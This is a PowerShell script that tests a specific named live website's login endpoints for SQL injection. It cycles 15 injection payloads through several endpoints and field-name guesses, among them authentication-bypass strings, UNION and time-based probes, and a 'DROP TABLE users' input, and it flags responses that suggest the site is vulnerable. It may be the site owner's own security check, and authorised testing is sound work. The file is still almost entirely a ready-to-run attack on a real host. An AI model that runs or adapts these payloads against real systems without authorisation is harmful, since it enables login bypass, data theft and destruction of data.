# SQL Injection Test Script for https://fadaly.mooo.com
$baseUrl = "https://fadaly.mooo.com"
$loginUrl = "$baseUrl/login"

# Possible API endpoints to test
$apiEndpoints = @(
    "$baseUrl/api/auth/login",
    "$baseUrl/api/login",
    "$baseUrl/api/user/login",
    "$baseUrl/login"
)

Write-Host "Testing SQL Injection on: $baseUrl" -ForegroundColor Cyan
Write-Host "Fetching login page..." -ForegroundColor Cyan

try {
    $null = Invoke-WebRequest -Uri $loginUrl -UseBasicParsing
    Write-Host "Login page loaded successfully" -ForegroundColor Green
} catch {
    Write-Host "Warning: Could not load login page: $($_.Exception.Message)" -ForegroundColor Yellow
}

# SQL Injection tests - testing both username and password fields
$tests = @(
    @{name="Test 1: Single Quote (Username)"; username="admin'"; password="test"},
    @{name="Test 2: Single Quote (Password)"; username="admin"; password="test'"},
    @{name="Test 3: OR 1=1 (Username)"; username="admin' OR '1'='1"; password="test"},
    @{name="Test 4: OR 1=1 (Password)"; username="admin"; password="test' OR '1'='1"},
    @{name="Test 5: OR 1=1-- (Username)"; username="admin' OR '1'='1'--"; password="test"},
    @{name="Test 6: OR 1=1-- (Password)"; username="admin"; password="test' OR '1'='1'--"},
    @{name="Test 7: UNION SELECT (Username)"; username="admin' UNION SELECT NULL--"; password="test"},
    @{name="Test 8: UNION SELECT (Password)"; username="admin"; password="test' UNION SELECT NULL--"},
    @{name="Test 9: Time-based MySQL (Username)"; username="admin'; SELECT SLEEP(5)--"; password="test"},
    @{name="Test 10: Time-based MySQL (Password)"; username="admin"; password="test'; SELECT SLEEP(5)--"},
    @{name="Test 11: Boolean-based (Username)"; username="admin' AND 1=1--"; password="test"},
    @{name="Test 12: Boolean-based (Password)"; username="admin"; password="test' AND 1=1--"},
    @{name="Test 13: Comment injection (Username)"; username="admin'/**/OR/**/1=1--"; password="test"},
    @{name="Test 14: Double quote (Username)"; username='admin"'; password="test"},
    @{name="Test 15: Semicolon injection (Username)"; username="admin'; DROP TABLE users--"; password="test"}
)

Write-Host "`nStarting SQL Injection tests..." -ForegroundColor Green
Write-Host "Testing multiple API endpoints and field name combinations`n" -ForegroundColor Yellow

# Common field name combinations to try
$fieldCombinations = @(
    @{username="username"; password="password"},
    @{username="user"; password="pass"},
    @{username="email"; password="password"},
    @{username="employee_code"; password="password"},
    @{username="code"; password="password"},
    @{username="txt_UserName"; password="txt_Password"},
    @{username="login"; password="password"}
)

# Calculate total tests
$totalTests = ($apiEndpoints.Count) * ($fieldCombinations.Count) * ($tests.Count)
Write-Host "Total tests to run: $totalTests" -ForegroundColor Cyan
Write-Host ""

$vulnerabilitiesFound = @()
$testsCompleted = 0

foreach ($endpoint in $apiEndpoints) {
    Write-Host "`n=== Testing Endpoint: $endpoint ===" -ForegroundColor Magenta
    
    foreach ($fields in $fieldCombinations) {
        Write-Host "`n  Testing field names: $($fields.username) / $($fields.password)" -ForegroundColor Cyan
        
        foreach ($test in $tests) {
            # Create JSON body (common for Next.js/React apps)
            $jsonBody = @{
                $fields.username = $test.username
                $fields.password = $test.password
            } | ConvertTo-Json
            
            # Test with JSON
            $statusCode = "N/A"
            $duration = 0
            $isVulnerable = $false
            $vulnReason = ""
            $content = ""
            
            try {
                $startTime = Get-Date
                $headers = @{
                    "Content-Type" = "application/json"
                    "Accept" = "application/json"
                }
                
                # Use -ErrorAction Stop to properly catch errors
                $testResponse = Invoke-WebRequest -Uri $endpoint -Method POST -Body $jsonBody -Headers $headers -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop
                
                $endTime = Get-Date
                $duration = ($endTime - $startTime).TotalSeconds
                $statusCode = $testResponse.StatusCode
                $content = $testResponse.Content
                
                # Check for vulnerability indicators
                if ($content -match "error|exception|syntax|sql|database|query|mysql|postgresql" -and 
                    $content -notmatch "incorrect|invalid|wrong|authentication|login") {
                    $isVulnerable = $true
                    $vulnReason = "SQL error in response"
                } elseif ($statusCode -eq 200 -and $duration -gt 4 -and $test.name -match "Time-based") {
                    $isVulnerable = $true
                    $vulnReason = "Time-based delay detected ($([math]::Round($duration, 2))s)"
                } elseif ($statusCode -eq 302 -or ($testResponse.Headers.Location -and $testResponse.Headers.Location -ne "")) {
                    $isVulnerable = $true
                    $vulnReason = "Redirect detected - possible successful injection"
                } elseif ($statusCode -eq 500) {
                    $isVulnerable = $true
                    $vulnReason = "500 Error - possible SQL error"
                }
            }
            catch {
                # Handle different types of exceptions
                if ($_.Exception.Response) {
                    $statusCode = $_.Exception.Response.StatusCode.value__
                    try {
                        $errorStream = $_.Exception.Response.GetResponseStream()
                        $reader = New-Object System.IO.StreamReader($errorStream)
                        $content = $reader.ReadToEnd()
                    } catch {
                        $content = ""
                    }
                } else {
                    $statusCode = "N/A"
                }
                
                if ($statusCode -eq 500) {
                    $isVulnerable = $true
                    $vulnReason = "500 Error - possible SQL error"
                }
            }
            
            # Print result once
            $testsCompleted++
            if ($isVulnerable) {
                Write-Host "    [$($test.name)]" -ForegroundColor White
                Write-Host "      Status: $statusCode | [!!! VULNERABILITY DETECTED !!!] $vulnReason" -ForegroundColor Red
                $vulnerabilitiesFound += "Endpoint: $endpoint | Fields: $($fields.username)/$($fields.password) | Test: $($test.name) | Reason: $vulnReason"
            } else {
                Write-Host "    [$($test.name)] - Status: $statusCode" -ForegroundColor $(if ($statusCode -eq 401) { "Yellow" } else { "Gray" })
            }
            
            # Show progress every 10 tests
            if ($testsCompleted % 10 -eq 0) {
                $progress = [math]::Round(($testsCompleted / $totalTests) * 100, 1)
                Write-Host "      Progress: $testsCompleted/$totalTests ($progress%)" -ForegroundColor DarkGray
            }
            
            Start-Sleep -Milliseconds 300
        }
    }
}

Write-Host "`n" + "="*60 -ForegroundColor Cyan
Write-Host "Tests completed: $testsCompleted/$totalTests" -ForegroundColor Cyan
Write-Host "="*60 -ForegroundColor Cyan

if ($vulnerabilitiesFound.Count -gt 0) {
    Write-Host "`n[!!! VULNERABILITIES FOUND !!!]" -ForegroundColor Red
    Write-Host "Total vulnerabilities detected: $($vulnerabilitiesFound.Count)" -ForegroundColor Red
    Write-Host ""
    foreach ($vuln in $vulnerabilitiesFound) {
        Write-Host "  - $vuln" -ForegroundColor Yellow
    }
    Write-Host ""
    Write-Host "RECOMMENDATION: Review and fix these vulnerabilities immediately!" -ForegroundColor Red
} else {
    Write-Host "`n[OK] No obvious vulnerabilities detected in tested endpoints" -ForegroundColor Green
    Write-Host ""
    Write-Host "Summary:" -ForegroundColor Cyan
    Write-Host "  - Tests completed: $testsCompleted" -ForegroundColor White
    Write-Host "  - Endpoints tested: $($apiEndpoints.Count)" -ForegroundColor White
    Write-Host "  - Field combinations tested: $($fieldCombinations.Count)" -ForegroundColor White
    Write-Host "  - Injection patterns tested: $($tests.Count)" -ForegroundColor White
    Write-Host ""
    Write-Host "Note: This does not guarantee the site is secure." -ForegroundColor Yellow
    Write-Host "      Manual testing and code review are still recommended." -ForegroundColor Yellow
}
